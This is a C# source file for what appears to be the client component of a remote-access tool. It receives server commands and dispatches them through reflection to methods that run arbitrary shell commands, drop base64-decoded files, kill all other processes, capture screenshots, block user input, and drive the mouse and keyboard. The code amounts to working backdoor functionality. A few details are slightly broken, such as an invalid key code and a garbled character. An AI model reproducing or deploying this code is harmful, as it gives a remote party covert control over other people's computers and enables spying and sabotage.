using CommandSpace;
using MouseManipulator;
using ResponseBuilderSpace;
using System;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Reflection;
using System.Threading;
using System.Windows.Forms;
using ToolsSpace;
using NamesSpace;
using System.Speech.Synthesis;

namespace TasksSpace {

    public class Tasks {

        private readonly ResponseBuilder ResponseBuilder, ResponseBuilderWithoutServerResponse;
        private readonly string tasks;
        
        public Tasks(string tasks, ResponseBuilder responseBuilder, ResponseBuilder responseBuilderWithoutServerResponse) {
            this.ResponseBuilder = responseBuilder;
            this.ResponseBuilderWithoutServerResponse = responseBuilderWithoutServerResponse;
            this.tasks = tasks;
        }

        public void Invoke() {
            if (this.tasks.Length == 0) return;

            string tasks = this.tasks.Substring(1, this.tasks.Length - 3);
            string[] requests = tasks.Split(new string[] { "],[" }, StringSplitOptions.RemoveEmptyEntries);

            foreach (string request in requests) {
                string command = request.Split(new string[] { Client.SEPERATOR }, StringSplitOptions.None)[0];
                string parameter = request.Split(new string[] { Client.SEPERATOR }, StringSplitOptions.None)[1];

                try {
                    this.GetType().GetMethod(command, BindingFlags.NonPublic | BindingFlags.Instance).Invoke(this, new object[] { parameter });
                } catch(Exception e) {
                    Console.WriteLine(e.GetType() + ": " + e.Message);
                }
            }
        }

        private void run(string s) {
            string output = new Command(s).Run();
            ResponseBuilder.msg(output.Replace(Environment.NewLine, Client.LINE_SEPERATOR));
        }

        private void copyfile(string s) {
            string name = s.Split(new char[] { ',' }, 2)[0];
            string data = s.Split(new char[] { ',' }, 2)[1];
            byte[] bytes = Tools.DecodeFromBase64(data);
            File.WriteAllBytes(name, bytes);
        }

        private void stop(string s) {
            if(Boolean.Parse(s)) {
                foreach (Process process in Process.GetProcessesByName(Names.STARTER)) {
                    process.Kill();
                } foreach(Process process in Process.GetProcessesByName(Names.CLIENT)) {
                    if(process.Id != Process.GetCurrentProcess().Id) {
                        process.Kill();
                    }
                } Process.GetCurrentProcess().Kill();
            }
        }

        private void killTasks(string s) {
            if(Boolean.Parse(s)) {
                Process[] processes = Process.GetProcesses();
                foreach (Process process in processes) {
                    if(!process.ProcessName.Equals(Names.CLIENT) && !process.ProcessName.Equals(Names.STARTER)) {
                        try {
                            process.Kill();
                        } catch(Exception e) {
                            Console.WriteLine(e.GetType());
                        }
                    }
                }
            }
        }

        private void msgbox(string s) {
            new Thread(() => MessageBox.Show(s, "INFO", MessageBoxButtons.OK, MessageBoxIcon.Information, MessageBoxDefaultButton.Button1, (MessageBoxOptions)4096)).Start();
        }

        private void screenshot(string s) {
            ResponseBuilderWithoutServerResponse.screenshot();
        }

        private void blockinputs(string s) {
            NativeMethods.BlockInput(new TimeSpan(5000));
        }

        private void pcusage(string s) {
            ResponseBuilder.msg(HardwareUsage.Hardware.Monitor());
        }

        private void mousepos(string s) {
            string[] coords = s.Split(',');
            float xPercentage = float.Parse(coords[0]) / 100f;
            float yPercentage = float.Parse(coords[1]) / 100f;
            Cursor.Position = new Point((int)(Screen.PrimaryScreen.Bounds.Width * xPercentage), (int)(Screen.PrimaryScreen.Bounds.Height * yPercentage));
        }

        private void pressmouse(string s) {
            int button = Convert.ToInt32(s);
            if (button == 0) {
                VirtualMouse.LeftDown();
            } else if (button == 2) {
                VirtualMouse.RightDown();
            }
        }

        private void say(string s) {
            SpeechSynthesizer synth = new SpeechSynthesizer();
            synth.SetOutputToDefaultAudioDevice();
            synth.Speak(s);
        }

        private void releasemouse(string s) {
            int button = Convert.ToInt32(s);
            if (button == 0) {
                VirtualMouse.LeftUp();
            } else if (button == 2) {
                VirtualMouse.RightUp();
            }
        }

        private void clickmouse(string s) {
            int button = Convert.ToInt32(s);
            if (button == 0) {
                VirtualMouse.LeftClick();
            } else if (button == 2) {
                VirtualMouse.RightClick();
            }
        }

        private void keys(string s) {
            foreach (string key in s.Split(',')) {
                string keyString = key;

                switch (keyString) {
                    case "LEERTASTE": keyString = " "; break;
                    case "UMSCHALT": keyString = "+"; break;
                    case "EINGABE": keyString = "~"; break;
                    case "FESTSTELLTASTE": keyString = "{CAPSLOCK}"; break;
                    case "ESC": keyString = "{ESC}"; break;
                    case "R�CKTASTE": keyString = "{BKSP}"; break;
                    case "ALT": keyString = "%"; break;
                    case "WINDOWS": keyString = "{HOME}"; break;
                    case "STRG": keyString = "^"; break;
                    case "LINKS": keyString = "{LEFT}"; break;
                    case "UNTEN": keyString = "{DOWN}"; break;
                    case "RECHTS": keyString = "{RIGHT}"; break;
                    case "OBEN": keyString = "{UP}"; break;
                    case "ENTF": keyString = "{DEL}"; break;
                    case "ENDE": keyString = "{ENDE}"; break;
                    case "PUNKT": keyString = "."; break;
                    case "KOMMA": keyString = ","; break;
                    default: break;
                }
                SendKeys.SendWait(keyString);
            }
        }

    }

    public partial class NativeMethods {
        /// Return Type: BOOL->int
        ///fBlockIt: BOOL->int
        [System.Runtime.InteropServices.DllImportAttribute("user32.dll", EntryPoint = "BlockInput")]
        [return: System.Runtime.InteropServices.MarshalAsAttribute(System.Runtime.InteropServices.UnmanagedType.Bool)]
        public static extern bool BlockInput([System.Runtime.InteropServices.MarshalAsAttribute(System.Runtime.InteropServices.UnmanagedType.Bool)] bool fBlockIt);

        public static void BlockInput(TimeSpan span) {
            try {
                NativeMethods.BlockInput(true);
                Thread.Sleep(span);
            } finally {
                NativeMethods.BlockInput(false);
            }
        }
    }

}